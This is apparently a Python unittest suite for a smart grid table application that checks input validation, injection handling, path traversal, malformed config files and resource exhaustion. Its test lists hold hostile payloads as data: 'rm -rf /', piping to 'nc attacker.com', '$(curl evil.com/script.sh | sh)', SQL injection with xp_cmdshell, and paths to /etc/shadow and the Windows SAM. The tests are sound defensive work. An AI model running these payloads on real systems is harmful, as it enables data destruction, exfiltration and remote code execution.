#!/usr/bin/env python3
"""
Security and Validation Tests for Smart Grid Table Application.
Tests input validation, injection prevention, and security boundaries.
"""

import sys
import os
import unittest
import tempfile
import json
import subprocess
from unittest.mock import patch, MagicMock

# Add parent directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

# Import our modules
from app_state import AppState
from config_loader import ConfigLoader
from input_handling.command_dispatcher import CommandDispatcher


class TestInputValidation(unittest.TestCase):
    """Test input validation and sanitization."""
    
    def setUp(self):
        self.app_state = AppState()
        self.config_loader = ConfigLoader("config.json")
        self.mock_table = MagicMock()
        self.mock_mqtt = MagicMock()
        self.dispatcher = CommandDispatcher(
            self.app_state, 
            self.mock_table, 
            self.config_loader,
            self.mock_mqtt
        )
    
    def test_sql_injection_attempts(self):
        """Test commands that look like SQL injection attempts."""
        malicious_commands = [
            "mode set '; DROP TABLE users; --",
            "scenario set '; DELETE FROM config; --",
            "table list'; UPDATE settings SET value='hacked'; --",
            "help'; EXEC sp_configure 'xp_cmdshell', 1; --",
        ]
        
        for cmd in malicious_commands:
            # Should not crash or execute anything dangerous
            try:
                self.dispatcher.dispatch_console_command(cmd)
                # If it doesn't crash, that's good
            except Exception:
                # Exceptions are okay, crashes are not
                pass
    
    def test_command_injection_attempts(self):
        """Test commands that attempt shell injection."""
        injection_attempts = [
            "help; rm -rf /",
            "scenario list && cat /etc/passwd",
            "table list | nc attacker.com 1234",
            "mode set `whoami`",
            "calculate $(curl evil.com/script.sh | sh)",
            "help; echo 'hacked' > /tmp/pwned",
        ]
        
        for cmd in injection_attempts:
            # Should be treated as invalid commands, not executed
            try:
                self.dispatcher.dispatch_console_command(cmd)
            except Exception:
                pass  # Exceptions are fine, execution is not
    
    def test_path_traversal_attempts(self):
        """Test path traversal attempts in config loading."""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "../../../../proc/version",
            "../config/../../../etc/hosts",
        ]
        
        for path in dangerous_paths:
            # Should handle safely, not access system files
            config_loader = ConfigLoader(path)
            # Should result in empty config, not system file content
            self.assertEqual(config_loader.main_config, {})
    
    def test_buffer_overflow_attempts(self):
        """Test extremely long inputs that might cause buffer overflows."""
        # Very long mode name
        long_mode = "x" * 100000
        result = self.app_state.set_mode(long_mode)
        self.assertFalse(result, "Should reject extremely long mode names")
        
        # Very long command
        long_command = "help " + "x" * 100000
        try:
            self.dispatcher.dispatch_console_command(long_command)
        except Exception:
            pass  # Should handle gracefully
        
        # Very long broker IP
        long_ip = "1.2.3.4" + "x" * 100000
        self.app_state.local_broker_ip = long_ip
        # Should not crash
        self.assertIsInstance(self.app_state.local_broker_ip, str)


class TestConfigurationSecurity(unittest.TestCase):
    """Test configuration file security."""
    
    def test_malicious_json_payloads(self):
        """Test malicious JSON payloads in config files."""
        malicious_configs = [
            # Nested object bomb
            '{"a": ' + '{"b": ' * 1000 + '{}' + '}' * 1000 + '}',
            # Very deep nesting
            '{"' + '", "'.join([f'level_{i}' for i in range(1000)]) + '": "deep"}',
            # Large array
            '{"huge_array": [' + ','.join([f'"{i}"' for i in range(10000)]) + ']}',
            # Unicode attacks
            '{"unicode": "\\u0000\\u0001\\u0002\\u0003"}',
            # Script injection attempts in JSON
            '{"script": "<script>alert(\\"xss\\")</script>"}',
        ]
        
        for malicious_json in malicious_configs:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                f.write(malicious_json)
                f.flush()
                
                # Should handle malicious config safely
                try:
                    config_loader = ConfigLoader(f.name)
                    # Should either load safely or return empty config
                    self.assertIsInstance(config_loader.main_config, dict)
                except:
                    # Or handle the error gracefully
                    pass
                
            os.unlink(f.name)
    
    def test_symlink_attacks(self):
        """Test symbolic link attacks on config files."""
        # Create a test file
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as test_file:
            test_file.write('{"test": "safe"}')
            test_file_path = test_file.name
        
        try:
            # Try to create symlink to system file
            symlink_path = test_file_path + "_symlink"
            try:
                os.symlink("/etc/passwd", symlink_path)
                config_loader = ConfigLoader(symlink_path)
                # Should not load system file content
                self.assertEqual(config_loader.main_config, {})
                os.unlink(symlink_path)
            except OSError:
                # Permission denied is expected and good
                pass
        finally:
            os.unlink(test_file_path)


class TestStateManipulation(unittest.TestCase):
    """Test attempts to manipulate application state dangerously."""
    
    def test_invalid_state_values(self):
        """Test setting invalid or dangerous state values."""
        app_state = AppState()
        
        # Try to set dangerous types
        dangerous_values = [
            None,
            {"malicious": "dict"},
            ["malicious", "list"],
            lambda x: x,  # Function
            type,  # Class
            open,  # Built-in function
        ]
        
        for value in dangerous_values:
            # Try to set mode to dangerous value
            result = app_state.set_mode(value)
            self.assertFalse(result, f"Should reject dangerous mode value: {type(value)}")
            
            # Try to set refresh rate to dangerous value
            try:
                app_state.refresh_rate = value
                # If it accepts it, should still be a safe type
                self.assertIsInstance(app_state.refresh_rate, (int, float))
            except:
                # Rejecting is also fine
                pass
    
    def test_state_consistency_attacks(self):
        """Test attempts to create inconsistent state."""
        app_state = AppState()
        
        # Try to create contradictory states
        app_state.is_running = False
        app_state.set_mode("pf")  # Should this work when not running?
        
        # State should remain consistent
        self.assertFalse(app_state.is_running)
        
        # Force update when shutdown
        app_state.request_shutdown()
        app_state.request_update()
        # Should handle gracefully
        self.assertFalse(app_state.is_running)


class TestResourceExhaustion(unittest.TestCase):
    """Test resistance to resource exhaustion attacks."""
    
    def test_memory_exhaustion_resistance(self):
        """Test resistance to memory exhaustion."""
        # Try to create many objects rapidly
        objects = []
        try:
            for i in range(10000):
                app_state = AppState()
                objects.append(app_state)
                if i % 1000 == 0:
                    # Check memory periodically
                    import psutil
                    memory_mb = psutil.Process().memory_info().rss / 1024 / 1024
                    if memory_mb > 500:  # Stop if using more than 500MB
                        break
        except MemoryError:
            # Should handle memory limits gracefully
            pass
        
        # Clean up
        del objects
    
    def test_file_descriptor_exhaustion(self):
        """Test resistance to file descriptor exhaustion."""
        # Try to open many config files
        config_loaders = []
        try:
            for i in range(1000):
                config_loader = ConfigLoader("config.json")
                config_loaders.append(config_loader)
        except OSError:
            # Should handle file descriptor limits gracefully
            pass
        
        # Clean up
        del config_loaders


class TestDataIntegrity(unittest.TestCase):
    """Test data integrity and corruption resistance."""
    
    def test_config_corruption_handling(self):
        """Test handling of corrupted configuration files."""
        corrupted_configs = [
            b'\x00\x01\x02\x03\x04\x05',  # Binary data
            b'\xff\xfe\xfd\xfc',  # High bytes
            "{"*1000,  # Unbalanced braces
            '"'*1000,  # Unbalanced quotes
            '\n' * 10000,  # Many newlines
            '\t' * 10000,  # Many tabs
        ]
        
        for corrupted_data in corrupted_configs:
            with tempfile.NamedTemporaryFile(mode='wb', delete=False) as f:
                if isinstance(corrupted_data, str):
                    f.write(corrupted_data.encode('utf-8', errors='ignore'))
                else:
                    f.write(corrupted_data)
                f.flush()
                
                # Should handle corrupted file gracefully
                config_loader = ConfigLoader(f.name)
                self.assertEqual(config_loader.main_config, {})
                
            os.unlink(f.name)
    
    def test_concurrent_modification_resistance(self):
        """Test resistance to concurrent file modifications."""
        import threading
        import time
        
        # Create a config file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump({"test": "value"}, f)
            config_file = f.name
        
        def modify_file():
            for i in range(100):
                try:
                    with open(config_file, 'w') as f:
                        json.dump({"modified": i}, f)
                    time.sleep(0.001)
                except:
                    pass
        
        def read_file():
            for i in range(100):
                try:
                    config_loader = ConfigLoader(config_file)
                    # Should either succeed or fail gracefully
                    self.assertIsInstance(config_loader.main_config, dict)
                    time.sleep(0.001)
                except:
                    # Graceful failure is acceptable
                    pass
        
        # Start concurrent modification and reading
        modifier = threading.Thread(target=modify_file)
        reader = threading.Thread(target=read_file)
        
        modifier.start()
        reader.start()
        
        modifier.join()
        reader.join()
        
        os.unlink(config_file)


def run_security_tests():
    """Run all security tests."""
    print("🔒 Running Security and Validation Tests")
    print("=" * 80)
    
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add all test classes
    test_classes = [
        TestInputValidation,
        TestConfigurationSecurity,
        TestStateManipulation,
        TestResourceExhaustion,
        TestDataIntegrity,
    ]
    
    for test_class in test_classes:
        tests = loader.loadTestsFromTestCase(test_class)
        suite.addTests(tests)
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    print("\n" + "=" * 80)
    if result.wasSuccessful():
        print("✅ ALL SECURITY TESTS PASSED!")
        return 0
    else:
        print("❌ Some security tests failed.")
        print(f"Failures: {len(result.failures)}")
        print(f"Errors: {len(result.errors)}")
        return 1


if __name__ == "__main__":
    exit_code = run_security_tests()
    sys.exit(exit_code) 